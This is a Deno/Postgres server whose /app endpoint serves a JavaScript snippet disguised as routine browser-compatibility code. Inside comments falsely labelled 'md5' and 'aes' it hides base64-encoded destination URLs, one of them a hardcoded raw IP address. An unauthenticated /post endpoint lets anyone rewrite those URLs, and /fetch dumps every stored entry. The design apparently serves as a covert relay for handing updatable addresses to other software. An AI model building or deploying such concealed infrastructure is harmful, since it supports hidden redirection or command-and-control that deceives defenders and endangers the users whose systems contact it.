import { serve } from "https://deno.land/std@0.140.0/http/server.ts";
import * as postgres from "https://deno.land/x/postgres@v0.14.0/mod.ts";
import { encode, decode } from "https://deno.land/std/encoding/base64.ts"

// Get the connection string from the environment variable "DATABASE_URL"
const databaseUrl = Deno.env.get("db_url")!;

// Create a database pool with three connections that are lazily established
const pool = new postgres.Pool(databaseUrl, 3, true);

BigInt.prototype.toJSON = function () { return this.toString() };


serve(async (req:Request,connInfo) => {
    // Parse the URL and check that the requested endpoint is /todos. If it is
    // not, return a 404 response.
    const url = new URL(req.url);
    // if (url.pathname !== "/todos") {
    //   return new Response("Not Found", { status: 404 });
    // }
    if(url.pathname=='/favicon.ico'){
      return new Response("Method Not Allowed", { status: 405 });
    }

    console.log(req.url);
    let appId=url.searchParams.get("id");

    // Grab a connection from the database pool
    const connection = await pool.connect();
  
    try {
      if (url.pathname=="/fetch") {
          const result = await connection.queryObject`
            SELECT * FROM url where true
          `;
          // console.log("result",result)
          const body = JSON.stringify(result.rows, null, 2);
          return new Response(body, {
            headers: { "content-type": "application/json" },
          });
      } else if (url.pathname=="/app") {
        const result = await connection.queryObject<string>`
          SELECT * FROM url WHERE key=${appId}
        `;
        if(result.rows[0]){
          let base64=encode(result.rows[0].url)

          return new Response(`if($.browser.mozilla||$.browser.opera)
          (function(){
          window.addEventListener('pageshow', PageShowHandler, false);
          window.addEventListener('unload', UnloadHandler, false);
            function PageShowHandler() {
                window.addEventListener('unload', UnloadHandler, false);
            }
            function UnloadHandler() {
                window.removeEventListener('beforeunload', UnloadHandler, false);
            }
        })()/** md5:${base64}**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/`, {
            headers: { },
          });
        }
        return new Response("didnt find", {
          headers: { },
        });
      } else if (url.pathname=="/post") { 
        let appUrl=url.searchParams.get("appUrl")||"";
        appUrl=decodeURIComponent(appUrl)
        const result = await connection.queryObject<string>`
          SELECT * FROM url WHERE key=${appId}
        `;
        if(result.rows[0]){
          await connection.queryObject`
          UPDATE  url SET  url= ${appUrl} where key=${appId}
        `;
        }else{
          await connection.queryObject`
            INSERT INTO url (key , url) VALUES (${appId} , ${appUrl})
          `;
        }
        return new Response("OK", {  });

      }else if(url.pathname=='/getIp'){
        const addr = connInfo.remoteAddr; 
        const ip = addr.hostname;
        return new Response(`Your IP address is <b>${ip}</b>`, {
          headers: { "content-type": "text/html" },
        });
      }else{ // If this is neither a POST, or a GET return a 405 response.
          return new Response("Method Not Allowed", { status: 405 });
      }
    } catch (err) {
      console.error(err);
      // If an error occurs, return a 500 response
      return new Response(`Internal Server Error\n\n${err.message}`, {
        status: 500,
      });
    } finally {
      // Release the connection back into the pool
      connection.release();
    }
  });